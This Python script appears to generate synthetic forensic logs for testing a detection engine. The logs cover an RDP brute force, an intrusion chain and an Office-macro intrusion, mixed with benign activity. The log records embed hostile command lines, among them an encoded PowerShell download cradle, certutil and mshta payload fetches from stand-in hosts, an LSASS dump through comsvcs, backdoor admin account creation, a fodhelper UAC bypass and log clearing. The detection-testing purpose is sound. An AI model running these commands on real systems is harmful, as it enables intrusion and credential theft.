"""Generate synthetic DFIR evidence (Windows Security, Sysmon, Wireshark CSV) to
exercise the detection engine. Scenarios are defined declaratively below as test
fixtures; all addresses use documentation ranges (RFC 5737) and reserved names.

Two malicious scenarios (brute force -> logon -> script execution -> download ->
persistence -> priv-esc -> C2 beaconing -> credential access -> exfil -> log
clearing on WS-FIN-07; document lure -> proxy execution -> UAC bypass -> HTTPS
beacon on WS-HR-02) are mixed with benign background activity so false-positive
controls are tested too.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import os
import random
from datetime import datetime, timedelta

import pandas as pd

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

ATTACKER = "203.0.113.45"
C2_A = "198.51.100.23"
C2_B = "192.0.2.77"
HOSTS = {"WS-FIN-07": "10.10.20.37", "WS-HR-02": "10.10.30.12", "WS-ENG-11": "10.10.40.21",
         "DC01": "10.10.0.10", "FILESRV01": "10.10.0.20"}
MS_IP = "13.107.42.14"
WEB_IPS = ["198.18.4.20", "198.18.7.91", "198.18.12.5"]
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def h(name: str) -> str:
    md5 = hashlib.md5(name.encode()).hexdigest().upper()
    sha = hashlib.sha256(name.encode()).hexdigest().upper()
    return f"MD5={md5},SHA256={sha}"


def b64(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


class Builder:
    def __init__(self, seed: int):
        self.rng = random.Random(seed)
        self.win, self.sys, self.net = [], [], []

    def w(self, ts, eid, host, msg, **kw):
        self.win.append({"TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
                         "EventID": eid, "Computer": host, "Message": msg, **kw})

    def s(self, ts, eid, host, user, **kw):
        self.sys.append({"UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "EventID": eid,
                         "Computer": host, "User": user, **kw})

    def n(self, ts, src, dst, proto, length, info):
        self.net.append({"Time": ts.strftime("%Y-%m-%d %H:%M:%S.%f"), "Source": src, "Destination": dst,
                         "Protocol": proto, "Length": length, "Info": info})

    def proc(self, ts, host, user, pid, image, cmd, ppid, pimage, hashes=None, security=False):
        self.s(ts, 1, host, user, ProcessId=pid, Image=image, CommandLine=cmd, ParentProcessId=ppid,
               ParentImage=pimage, Hashes=hashes or h(image))
        if security:
            self.w(ts + timedelta(milliseconds=self.rng.randint(5, 400)), 4688, host,
                   "A new process has been created.", SubjectUserName=user.split("\\")[-1],
                   NewProcessName=image, NewProcessId=hex(pid), ProcessId=hex(ppid),
                   ParentProcessName=pimage, CommandLine=cmd)

    def conn(self, ts, host, user, pid, image, dst, dport, hostname=None, wire=True):
        sport = self.rng.randint(49152, 65000)
        self.s(ts, 3, host, user, ProcessId=pid, Image=image, SourceIp=HOSTS[host], SourcePort=sport,
               DestinationIp=dst, DestinationPort=dport, DestinationHostname=hostname, Protocol="tcp",
               Initiated="true")
        if wire:
            self.n(ts + timedelta(milliseconds=self.rng.randint(1, 30)), HOSTS[host], dst, "TCP", 66,
                   f"{sport} > {dport} [SYN] Seq=0 Win=64240 Len=0")


def scenario_a(b, t0):
    host, user, r = "WS-FIN-07", "CORP\\jdoe", b.rng
    ip = HOSTS[host]
    # port scan from attacker
    t = t0
    for p in [21,22,23,25,53,80,110,135,139,143,443,445,993,1433,1723,3306,3389,5432,5900,5985,8080,8443,9200]:
        t += timedelta(milliseconds=r.randint(300, 1400))
        b.n(t, ATTACKER, ip, "TCP", 58, f"51234 > {p} [SYN] Seq=0 Win=1024 Len=0")
        b.n(t+timedelta(milliseconds=2), ip, ATTACKER, "TCP", 54,
            f"{p} > 51234 [{'SYN, ACK' if p in (135,445,3389) else 'RST, ACK'}] Seq=0 Len=0")
    # rdp brute force -> success
    t = t0 + timedelta(minutes=4)
    for _ in range(18):
        t += timedelta(seconds=r.uniform(6, 10))
        b.w(t, 4625, host, "An account failed to log on.", TargetUserName="jdoe",
            IpAddress=ATTACKER, IpPort=r.randint(50000, 60000), LogonType=10)
    t += timedelta(seconds=15)
    b.w(t, 4624, host, "An account was successfully logged on.", TargetUserName="jdoe",
        IpAddress=ATTACKER, IpPort=r.randint(50000, 60000), LogonType=10)
    # execution: cmd -> encoded powershell cradle
    t += timedelta(seconds=80)
    b.proc(t, host, user, 4100, r"C:\Windows\System32\cmd.exe", "cmd.exe", 3312,
           r"C:\Windows\explorer.exe", security=True)
    t += timedelta(seconds=15)
    cradle = f"IEX (New-Object Net.WebClient).DownloadString('http://{ATTACKER}/s2.ps1')"
    b.proc(t, host, user, 4120, PS, f"powershell.exe -nop -w hidden -enc {b64(cradle)}", 4100,
           r"C:\Windows\System32\cmd.exe", security=True)
    b.conn(t+timedelta(seconds=2), host, user, 4120, PS, ATTACKER, 80)
    # certutil download of payload
    t += timedelta(seconds=50)
    drop = r"C:\Users\jdoe\AppData\Local\Temp\svcupdate.exe"
    cu = r"C:\Windows\System32\certutil.exe"
    b.proc(t, host, user, 4388, cu,
           f"certutil.exe -urlcache -split -f http://cdn-sync.example.net/upd/svcupdate.exe {drop}", 4120, PS, security=True)
    b.s(t+timedelta(seconds=1), 22, host, user, ProcessId=4388, Image=cu,
        QueryName="cdn-sync.example.net", QueryResults=f"::ffff:{C2_A};")
    b.conn(t+timedelta(seconds=2), host, user, 4388, cu, C2_A, 80, "cdn-sync.example.net")
    b.s(t+timedelta(seconds=4), 11, host, user, ProcessId=4388, Image=cu, TargetFilename=drop)
    # payload runs, persistence via run key + scheduled task
    t += timedelta(seconds=46)
    b.proc(t, host, user, 5012, drop, f"{drop} -k netsvc", 4120, PS, hashes=h("implant"))
    t += timedelta(seconds=30)
    b.s(t, 13, host, user, ProcessId=5012, Image=drop,
        TargetObject=r"HKU\S-1-5-21-100-200-300-1104\Software\Microsoft\Windows\CurrentVersion\Run\SvcUpdate",
        Details=drop)
    t += timedelta(seconds=25)
    b.proc(t, host, user, 5100, r"C:\Windows\System32\schtasks.exe",
           f'schtasks /create /tn "EdgeUpdateCore" /tr "{drop}" /sc onlogon /ru SYSTEM /f', 4120, PS)
    b.w(t+timedelta(seconds=1), 4698, host, "A scheduled task was created.", SubjectUserName="jdoe",
        TaskName=r"\EdgeUpdateCore", TaskContent=f"<Exec><Command>{drop}</Command></Exec>")
    # local account + add to administrators
    t += timedelta(seconds=40)
    b.proc(t, host, user, 5200, r"C:\Windows\System32\net.exe",
           "net user svc_help P@ssZ1! /add", 5012, drop, security=True)
    b.w(t+timedelta(seconds=1), 4720, host, "A user account was created.", TargetUserName="svc_help",
        SubjectUserName="jdoe")
    t += timedelta(seconds=10)
    b.proc(t, host, user, 5210, r"C:\Windows\System32\net.exe",
           "net localgroup administrators svc_help /add", 5012, drop, security=True)
    b.w(t+timedelta(seconds=1), 4732, host, "A member was added to a security-enabled local group.",
        TargetUserName="Administrators", MemberName="svc_help", SubjectUserName="jdoe")
    # C2 beaconing (~60s, low jitter)
    t += timedelta(seconds=30)
    for i in range(20):
        t += timedelta(seconds=60 + r.uniform(-6, 6))
        b.conn(t, host, user, 5012, drop, C2_A, 443, "cdn-sync.example.net")
    # credential access (LSASS dump via comsvcs)
    t += timedelta(seconds=45)
    b.proc(t, host, user, 5400, r"C:\Windows\System32\rundll32.exe",
           r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Windows\Temp\lsass.dmp full",
           5012, drop, security=True)
    # staging + exfil over C2
    t += timedelta(seconds=60)
    arc = r"C:\Windows\Temp\fin_data.7z"
    b.proc(t, host, user, 5500, r"C:\Program Files\7-Zip\7z.exe",
           f'7z a -p"S3cr" {arc} C:\\Users\\jdoe\\Documents\\FinanceReports', 5012, drop)
    b.s(t+timedelta(seconds=5), 11, host, user, ProcessId=5500, Image=r"C:\Program Files\7-Zip\7z.exe",
        TargetFilename=arc)
    t += timedelta(seconds=30)
    for i in range(12):
        t += timedelta(seconds=r.uniform(4, 12))
        sp = r.randint(49152, 65000)
        b.s(t, 3, host, user, ProcessId=5012, Image=drop, SourceIp=ip, SourcePort=sp,
            DestinationIp=C2_A, DestinationPort=443, Protocol="tcp", Initiated="true")
        b.n(t, ip, C2_A, "TLSv1.2", r.randint(1_400_000, 1_800_000), "Application Data")
    # anti-forensics: clear logs
    t += timedelta(seconds=40)
    b.proc(t, host, user, 5600, r"C:\Windows\System32\wevtutil.exe", "wevtutil cl Security", 5012, drop, security=True)
    b.w(t+timedelta(seconds=1), 1102, host, "The audit log was cleared.", SubjectUserName="jdoe")


def scenario_b(b, t0):
    host, user, r = "WS-HR-02", "CORP\\asmith", b.rng
    t = t0
    b.proc(t, host, user, 2200, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
           r'"WINWORD.EXE" /n "C:\Users\asmith\Downloads\Invoice_Oct.docm"', 1900, r"C:\Windows\explorer.exe")
    t += timedelta(seconds=8)
    b.proc(t, host, user, 2240, r"C:\Windows\System32\mshta.exe",
           "mshta.exe http://cdn-sync.example.net/p.hta", 2200,
           r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", security=True)
    b.conn(t+timedelta(seconds=2), host, user, 2240, r"C:\Windows\System32\mshta.exe", C2_B, 80, "cdn-sync.example.net")
    t += timedelta(seconds=12)
    dll = r"C:\Users\asmith\AppData\Roaming\upd.dll"
    sc = f"IWR http://cdn-sync.example.net/upd.dll -OutFile {dll}"
    b.proc(t, host, user, 2280, PS, f"powershell -nop -enc {b64(sc)}", 2240,
           r"C:\Windows\System32\mshta.exe", security=True)
    b.s(t+timedelta(seconds=3), 11, host, user, ProcessId=2280, Image=PS, TargetFilename=dll)
    t += timedelta(seconds=20)
    b.proc(t, host, user, 2320, r"C:\Windows\System32\rundll32.exe", f"rundll32.exe {dll},Start", 2280, PS, security=True)
    # UAC bypass via fodhelper
    t += timedelta(seconds=25)
    b.s(t, 13, host, user, ProcessId=2320, Image=r"C:\Windows\System32\rundll32.exe",
        TargetObject=r"HKCU\Software\Classes\ms-settings\Shell\Open\command\(Default)", Details=dll)
    t += timedelta(seconds=5)
    b.proc(t, host, "NT AUTHORITY\\SYSTEM", 2360, r"C:\Windows\System32\cmd.exe", "cmd.exe /c upd",
           2400, r"C:\Windows\System32\fodhelper.exe", security=True)
    # HTTPS beacon (~30s)
    t += timedelta(seconds=20)
    for i in range(16):
        t += timedelta(seconds=30 + r.uniform(-3, 3))
        b.conn(t, host, user, 2320, r"C:\Windows\System32\rundll32.exe", C2_B, 443, "cdn-sync.example.net")


def benign(b, t0):
    r = b.rng
    base = {"WS-FIN-07": "jdoe", "WS-HR-02": "asmith", "WS-ENG-11": "bwong", "DC01": "svc_mon"}
    for host, u in base.items():
        user = f"CORP\\{u}"
        t = t0 - timedelta(hours=2)
        b.w(t, 4624, host, "An account was successfully logged on.", TargetUserName=u,
            IpAddress=HOSTS[host], LogonType=2)
        # routine browsing to allowlisted + web IPs
        for _ in range(40):
            t += timedelta(seconds=r.uniform(20, 180))
            dst = r.choice(WEB_IPS + [MS_IP, MS_IP])
            b.conn(t, host, user, r.randint(3000, 4000), r"C:\Program Files\Google\Chrome\chrome.exe",
                   dst, r.choice([443, 443, 80]),
                   r.choice(["www.example.com", "update.microsoft.com", "cdn.example.org"]))
        # scheduled update check to microsoft (irregular interval -> not a beacon)
        t = t0 - timedelta(hours=1)
        for _ in range(12):
            t += timedelta(seconds=r.uniform(120, 900))
            b.conn(t, host, user, 1500, r"C:\Program Files\Common Files\microsoft shared\edgeupdate\MicrosoftEdgeUpdate.exe",
                   MS_IP, 443, "update.microsoft.com", wire=False)
        # a couple of honest password typos (below brute-force threshold)
        t = t0 + timedelta(minutes=r.randint(10, 90))
        for _ in range(r.randint(1, 2)):
            t += timedelta(seconds=r.uniform(20, 60))
            b.w(t, 4625, host, "An account failed to log on.", TargetUserName=u,
                IpAddress=HOSTS[host], LogonType=2)
        b.w(t + timedelta(seconds=30), 4624, host, "An account was successfully logged on.",
            TargetUserName=u, IpAddress=HOSTS[host], LogonType=2)
    # benign admin PowerShell (no suspicious indicators) + signed scheduled task
    b.proc(t0, "WS-ENG-11", "CORP\\bwong", 6001, PS, "powershell.exe -File C:\\Scripts\\Get-DiskUsage.ps1",
           6000, r"C:\Windows\explorer.exe", security=True)
    b.proc(t0 + timedelta(minutes=5), "DC01", "CORP\\svc_mon", 6100, r"C:\Windows\System32\schtasks.exe",
           'schtasks /create /tn "BackupJob" /tr "C:\\Program Files\\Backup\\run.exe" /sc daily', 6050,
           r"C:\Program Files\Backup\agent.exe")


def generate(seed=1337, out_dir=None):
    out_dir = out_dir or os.path.join(BASE_DIR, "sample_data")
    os.makedirs(out_dir, exist_ok=True)
    b = Builder(seed)
    t0 = datetime(2026, 10, 18, 9, 0, 0)
    benign(b, t0)
    scenario_a(b, t0 + timedelta(minutes=30))
    scenario_b(b, t0 + timedelta(hours=3))
    pd.DataFrame(b.win).to_csv(os.path.join(out_dir, "windows_events.csv"), index=False)
    pd.DataFrame(b.sys).to_csv(os.path.join(out_dir, "sysmon_events.csv"), index=False)
    pd.DataFrame(b.net).to_csv(os.path.join(out_dir, "network_events.csv"), index=False)
    print(f"Sample data written to {out_dir}: "
          f"{len(b.win)} Windows, {len(b.sys)} Sysmon, {len(b.net)} network events.")
    return out_dir


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Generate synthetic DFIR sample data for CyberIA.")
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--out", default=None)
    args = ap.parse_args()
    generate(args.seed, args.out)
